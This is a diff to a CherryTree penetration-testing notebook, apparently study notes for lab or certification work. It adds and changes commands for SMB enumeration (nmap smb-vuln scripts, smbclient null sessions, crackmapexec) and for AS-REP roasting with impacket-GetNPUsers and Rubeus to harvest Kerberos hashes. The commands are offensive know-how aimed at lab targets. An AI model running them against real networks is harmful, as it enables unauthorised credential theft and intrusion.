@@ -1344,7 +1344,7 @@ _____________________________________
         <codebox char_offset="7" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nikto -host 10.11.1. | tee output.log</codebox>
         <codebox char_offset="24" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nikto -host 10.11.1. -port [port number 1], [port number 2], [port number 3]</codebox>
       </node>
-      <node name="smb" unique_id="34" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687626207" ts_lastsave="1690064532">
+      <node name="smb" unique_id="34" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687626207" ts_lastsave="1697746406">
         <rich_text scale="h1">Nmap</rich_text>
         <rich_text>
 
@@ -1460,10 +1460,13 @@ ____________________________________________
 
 Also check
 
+
+
 </rich_text>
         <rich_text link="node 41">CrackMapExec</rich_text>
         <rich_text>
-</rich_text>
+
+Especially: </rich_text>
         <codebox char_offset="27" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nmap --script smb-enum-shares -p 139,445 10.11.1.</codebox>
         <codebox char_offset="42" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nmap --script=smb-vuln* --script-args=unsafe=1 -T5 10.11.1.</codebox>
         <codebox char_offset="90" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbclient -N -L 10.11.1.   </codebox>
@@ -1483,6 +1486,7 @@ mget *</codebox>
 Password: &lt;password&gt;</codebox>
         <codebox char_offset="628" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">put &lt;filename&gt;</codebox>
         <codebox char_offset="653" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">get &lt;filename&gt;</codebox>
+        <codebox char_offset="743" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Especially</codebox>
       </node>
       <node name="Active Directory" unique_id="35" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687686505" ts_lastsave="1697146388">
         <rich_text>
@@ -1601,7 +1605,7 @@ crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq</code
           <codebox char_offset="198" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0">
 
 </codebox>
-          <node name="ASRreproasting" unique_id="90" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687808714" ts_lastsave="1687808763">
+          <node name="ASRreproasting" unique_id="90" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687808714" ts_lastsave="1697668618">
             <rich_text scale="h1">Request AS_REP message</rich_text>
             <rich_text>
 
@@ -1613,7 +1617,11 @@ crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq</code
 </rich_text>
             <rich_text justification="left"></rich_text>
             <rich_text>
+or without users:
 
+</rich_text>
+            <rich_text justification="left"></rich_text>
+            <rich_text>
 or
 
 </rich_text>
@@ -1622,9 +1630,9 @@ or
 
 </rich_text>
             <codebox char_offset="41" justification="left" frame_width="1810" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">#Try all the usernames in usernames.txt
-python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
+impacket-GetNPUsers jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
 #Use domain creds to extract targets and target them
-python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
+impacket-GetNPUsers jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
 
 or
 
@@ -1633,9 +1641,10 @@ impacket-GetNPUsers spookysec.local/svc-admin -no-pass
 
 or
 
-python3 /opt/impacket/examples/GetNPUsers.py domain.local/admin -request -no-pass -dc-ip 10.11.1.
+impacket-GetNPUsers domain.local/admin -request -no-pass -dc-ip 10.11.1.
 </codebox>
-            <codebox char_offset="48" justification="left" frame_width="1682" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
+            <codebox char_offset="62" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-GetNPUsers blackfield.local/ -dc-ip 10.10.10.192</codebox>
+            <codebox char_offset="68" justification="left" frame_width="1682" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
 Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)</codebox>
           </node>
           <node name="Kerberoasting" unique_id="101" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697239770" ts_lastsave="1697242037">
